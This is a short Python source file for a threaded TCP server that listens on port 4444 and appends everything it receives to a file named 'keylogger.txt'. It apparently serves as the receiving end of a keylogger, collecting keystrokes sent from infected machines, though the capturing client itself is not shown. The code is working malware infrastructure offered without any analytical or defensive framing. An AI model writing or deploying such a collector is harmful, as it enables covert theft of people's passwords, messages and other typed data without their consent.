import socket
import threading
import sys
import os

class Server():
  
   def __init__(self, Host, Port):
    
     self.__Host = Host
     self.__Port = Port

   def handle_client(self, conn, addr):

      print(f"Connected from {addr[0]}:{addr[1]}")

      try: 
            while True:

               data = conn.recv(1024)
               
               decode_msg = data.decode('utf-8')

               print(f"{decode_msg}", end='')

               with open("keylogger.txt", 'a') as f:

                  f.write(decode_msg)

               if not data:

                  print(f"Client {addr[0]} has disconnected")
                  break 

      except Exception as e:

         print(f"{addr[0]} has disconnected, due to {e}")
         
      finally:

         conn.close()
         

   def start_server(self):
     
      with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         Adress = (self.__Host, self.__Port)
         s.bind(Adress)
         s.listen()
         print(f"Server is listening on {self.__Host}:{self.__Port}")
         print("Listening for connection...")
         try:

            while True:

               conn, addr = s.accept()

               handle_client = threading.Thread(target=self.handle_client, args=(conn,addr))
               handle_client.start()
            
         except KeyboardInterrupt:

            print("Server is shutting down!!!")
         
         finally: 
            
            s.close()
            print("Socket closed.")
            sys.exit(0)

if __name__ == '__main__':
  
  os.system('neofetch')  
  Host = "0.0.0.0"
  Port = 4444
  server = Server(Host, Port)

  server.start_server()
  

